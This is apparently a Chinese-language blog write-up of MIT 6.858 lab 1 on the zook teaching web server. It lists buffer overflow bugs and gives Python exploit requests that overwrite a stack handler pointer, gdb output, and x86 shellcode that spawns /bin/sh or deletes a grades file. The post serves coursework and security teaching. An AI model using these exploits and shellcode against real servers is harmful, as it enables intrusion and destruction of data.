---
layout: post
title: MIT 6.858 lab 1 - Buffer overflows
categories: [MIT 6.858, lab]
---

## zook 代码解读

- zookld：负责根据配置启动进程，包括 zookd（Web服务，负责分发），zook http 服务和 zookfs 另外一个服务。zookld 会在 main() 中打开并经监听指定的端口（默认 80，是 Web 服务器对外接口），然后将此端口发给 zookd 使用。
    1. `start_server()` 起一个 HTTP socket，根据配置文件是 8080
    2. `NCONF_get_string` 从 .conf 文件中提取目标配置信息，然后 launch_svc 拉起 zookd（execve 可执行文件），负责分发请求，每次 `launch_srv()` 都会创建一对 socketpair，将服务的 fd  放在 `svcfds[]` ，用于内部进程间通信。 zookd 第一个拉起，所以 `svcfds[0]`  是 zookd。
    3. 使用 `NCONF_get_string` 从配置文件中读出 http_svcs 配置（是 HTTP 服务，html 等，从配置来看二进制也是 zookfs_svc ），用 `CONF_parse_list` 最终也 `launch_svc()`  出一个 http 服务，`svcfds[1]`  是 zook 即 。
    4. 把 1 创建的 http socket 传给 2 的 zookd、把 3 创建的 http  服务的 socket 发给 zookd
    5. 从配置文件中读出 url pattern 发给 zookd。就是每个服务配置文件中的 url 配置项
    6. 最后创建其它非 http 的服务，这里是 conf 中 extra_svcs  项配置的 zookfs。

- zookd：接收客户端的请求，在 `process_client()` 中处理请求，根据 URL path patern 转发给某一个 http 服务处理
    1. `http_request_line()`，从客户端的请求中提取 path 到 `reqpath`，提取各种 HTTP 请求信息到 env，如 method、protocol 等等，保存到环境变量

- zookfs：这个进程同时包含 http 服务和其它 non-http 的 cgi 服务
    1. `http_request_headers()` 解析请求中的 header 信息，保存到环境变量
    2. `http_serve` 处理请求，根据路径分发给相应 handler：`http_serve_directory` 处理目录（html）、`http_serve_executable` 处理 cgi 脚本

## exercise 1. 寻找 bug

```
[zookd.c:70]
process_client 函数的 reqpath 可能被 http_request_line 接收的客户端的 GET /foo.html HTTP/1.0 中的 path 栈溢出
    char reqpath[2048]; // 实际当 path 超过 1007 字节后 [http.c:282] 提前溢出
    ...
    if ((errmsg = http_request_line(fd, reqpath, env, &env_len)))

[http.c:23]
这里 pn 缓冲区可以被 name 入参栈溢出

    char pn[1024];
    snprintf(pn, 1024, "/tmp/%s", name);


[http.c:72]
http_request_line 函数的 buf 会被客户端发送的请求溢出，当请求发送方的一行请求超大时。

    static char buf[8192]; 
    ...
    if (http_read_line(fd, buf, sizeof(buf)) < 0)

[http.c:129]
http_request_headers 函数这里 buf 会被客户端发送的请求溢出，当请求发送方的一行请求超大时。

    static char buf[8192]; 
    ...
    if (http_read_line(fd, buf, sizeof(buf)) < 0)

[http.c:165]
这里 value[512]/envvar[512] 会被 buf（客户端的请求当 header 数据）栈溢出
        
        url_decode(value, sp);
        ...
            sprintf(envvar, "HTTP_%s", buf); // 将 HTTP header 读出一个

[http.c:282]
这里 pn 会被来自客户端的 name 栈溢出(就是之前的reqpath)，当 path 是 1024 行 \0 时

    char pn[1024];
    ...
    strcat(pn, name);
```
{: file='bugs.txt'}

## exercise 2. 造成溢出

选取 [http.c:282] 来做溢出：

```python
def build_exploit(shellcode):
    ## Things that you might find useful in constructing your exploit:
    ##   urllib.quote(s)
    ##     returns string s with "special" characters percent-encoded
    ##   struct.pack("<I", x)
    ##     returns the 4-byte binary encoding of the 32-bit integer x
    ##   variables for program addresses (ebp, buffer, retaddr=ebp+4)
    path = "/" + 'A'*1024
    req =   "GET " + path + " HTTP/1.0\r\n" + \
               "\r\n"
        return req
```
{: file='exploit-2a.py'}

选取 [http.c:165] 来溢出：

```python
    req =   "GET / HTTP/1.0\r\n " + \
               "Content-type: " + "A"*600 + \
               "\r\n"
```
{: file='exploit-2b.py'}

## exercise 3. 编写 shellcode

选用  [http.c:282] http_serve 函数来利用。

首先，要控制程序的 program counter。很容易想到的是覆盖 `http_serve()` 的 ret address（但其实这里有一个陷阱）。按照课程教材，运行 gdb 获取 saved ebp 的内存地址，用教材自带的样例 shellcode，即打开一个 shell 来验证劫持是否成功，然后构造 exploit 如下：

```python
def build_exploit(shellcode):
    ## Things that you might find useful in constructing your exploit:
    ##   urllib.quote(s)
    ##     returns string s with "special" characters percent-encoded
    ##   struct.pack("<I", x)
    ##     returns the 4-byte binary encoding of the 32-bit integer x
    ##   variables for program addresses (ebp, buffer, retaddr=ebp+4)
    path = "/" + 'A'*1020 + 'SEBP' + struct.pack(stack_retaddr+4) + shellcode
    req =   "GET " + path + " HTTP/1.0\r\n" + \
            "\r\n"
    return req
```

执行该 exploit 发现程序竟直接 crash 退出，并未如期望地执行 shellcoade。gdb 调试发现 `http_serve()` 返回时 eip 并不是我们期望的地址， 而是 41414141（‘AAAA’ ）—— 我们的 buf 垃圾填充。

```console
(gdb) nexti  //使用 next、nexti、stepi 这些有用的 gdb 命令

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```

这说明在返回值之前另外有某处存程序指针。

结合代码和 gdb 观察，原来栈上 ret addr 之前（低地址）还有个 handler 函数跳转指针，大致画出溢出发生前栈内存排布如下：

```
         ┌─────────────────────┐
         │                     │
         │   return addr 4     │
         │                     │
         ├─────────────────────┤
         │                     │
         │    saved ebp 4      │
   ebp   │                     │
   ────> ├─────────────────────┤
         │                     │
         │     foo,bar  8      │
         │                     │
         ├─────────────────────┤
         │                     │
         │     handler  4      │
         │                     │
         ├─────────────────────┤
         │      buf[1024]      │
         │         .           │
         │         .           │
         │         .           │
         │         .           |
         │  "/home/httpd/lab"  |--> buf[0~14]
         ├─────────────────────┤
         │                     │
   esp   │                     │
   ────> │                     │
```

显然，为了跳开这个「陷阱」，溢出目标应该改为这个 handler 指针。

修改后的 exploit 如下：

```python
    path = "/" + 'A'*1008 + struct.pack('<L', stack_saved_ebp + 8) + 'AAAA'*2 + 'SEBP' + 'SRET' + shellcode
    req =   "GET " + path + " HTTP/1.0\r\n" + \
                "\r\n"
```

运行此 exploit 可以在服务器端响应看到 `$`，即打开了一个 shell。

这里要注意，我们是使用单字节 string 来溢出，在内存中是直接顺序存储的，而 4 字节的指针则是按小端序（x86）存储（指针值的低位要放到低地址），因此要使用 `struct.pack('<L', stack_saved_ebp + 8)` 来转换顺序。

下一步，按实验的要求，修改 shellcode 为 unlink（删除）指定文件。

首先学习一下教材的样例 shellcode.S 是怎么写的，它的目标是调用 execve 系统调用来执行 /bin/sh。

execve 系统调用的原型是：

```c
int execve(const char *pathname, char *const argv[], char *const envp[]);
```

其中 pathname 是可执行文件的 pathname， argv[] 是 string 指针数组，指向要传递给该新程序的各个参数（ vector），其中 argv[0] 第一个参数约定是指向被执行文件的 filename（就是 pathname），argv 必须以 NULL 指针中断。

envp[] 也是 string 指针数组，指向的字符串是 key=value 形式，代表该执行程序的将设置的环境变量。同样必须以 NULL 指针中断。

shellcode.S 逐行解读如下：

```assembly
#include <sys/syscall.h>

#define STRING    "/bin/sh"
#define STRLEN    7
#define ARGV      (STRLEN+1)
#define ENVP      (ARGV+4)

.globl main
    .type   main, @function

 main:
    jmp     calladdr  //编译后机器码的第一个指令，就是跳转到末尾的 calladdr */

 popladdr:
    /* 首先要把 syscall 的参数（在栈上）准备好
    popl    %esi             /* 配合之前的 push STRING，这里 pop 恰好就把 STRING 的首地址放到了 esi，妙 */
    movl    %esi,(ARGV)(%esi)     /* set up argv pointer to pathname */
                                  /* esi 偏移 + 7（含null的字符串长度）*/
                                  /* 紧跟着 STRING （含 NULL）后，放置 argv pointer */
    xorl    %eax,%eax        /* get a 32-bit zero value */
    movb    %al,(STRLEN)(%esi)    /* null-terminate our string */ /* 为 STING 末尾补足 NULL */
    movl    %eax,(ENVP)(%esi)     /* set up null envp */
                                  /* 填充 ENVP 为 NULL，等价于为 ARGV 补充了一个 NULL 截断 */

    /* 接下来把准备好的参数，逐个放置到 register 中 */
    movb    $SYS_execve,%al        /* syscall arg 1: syscall number */ 
    movl    %esi,%ebx        /* syscall arg 2: string pathname */
    leal    ARGV(%esi),%ecx        /* syscall arg 2: argv */
    leal    ENVP(%esi),%edx        /* syscall arg 3: envp */
    int     $0x80            /* invoke syscall */

    /* 执行 exit 系统调用，让程序安静地退出。 */
    xorl    %ebx,%ebx        /* syscall arg 2: 0 */
    movl    %ebx,%eax
    inc     %eax         /* syscall arg 1: SYS_exit (1), uses */ //exit 的 syscall number 是 1
                         /* mov+inc to avoid null byte */
                         /* 这里不用立即数 1 是为了避免 shellcode 出现 NULL 字节 */
                         /* 否则shellcode无法传递  */
    int     $0x80        /* invoke syscall */

 calladdr:
    call    popladdr /* call 指令的作用，1. push 返回值 STRING 的地址到栈 2. 进入 ppladdr 执行后续指令 
    .ascii  STRING
```
{: file='shellcode.S'}

lab1 的要求是系统调用替换成 unlink，删除掉 /home/httpd/grades.txt 文件。先了解一下 unlink 这个系统调用：

```c
int unlink(const char *pathname);
```

只有一个参数，那比 execve 简单多了~ 修改后的 shellcode：

```assembly
#include <sys/syscall.h>

#define STRING    "/home/httpd/grades.txt"
#define STRLEN    22
#define PATHNAME  (STRLEN+1)

.globl main
    .type   main, @function

 main:
    jmp     calladdr

 popladdr:
    popl    %esi
    movl    %esi,(PATHNAME)(%esi) /* set up PATHNAME pointer to pathname */
    xorl    %eax,%eax             /* get a 32-bit zero value */
    movb    %al,(STRLEN)(%esi)    /* null-terminate our string */

    movb    $9,%al
    inc     %eax          /* syscall arg 1: syscall number */
                          /* 这里不用 $SYS_exit 立即数是因为 syscall number 为 10 */
                          /* 对应 ascii 码为 \n，在 http_read_line 处理时会替换成 0 */
    movl    %esi,%ebx     /* syscall arg 2: string pathname */
    int     $0x80         /* invoke syscall */

    xorl    %ebx,%ebx     /* syscall arg 2: 0 */
    movl    %ebx,%eax
    inc     %eax          /* syscall arg 1: SYS_exit (1), uses */
                          /* mov+inc to avoid null byte */
    int     $0x80         /* invoke syscall */

 calladdr:
    call    popladdr
    .ascii  STRING
```
{: file='shellcodes.S'}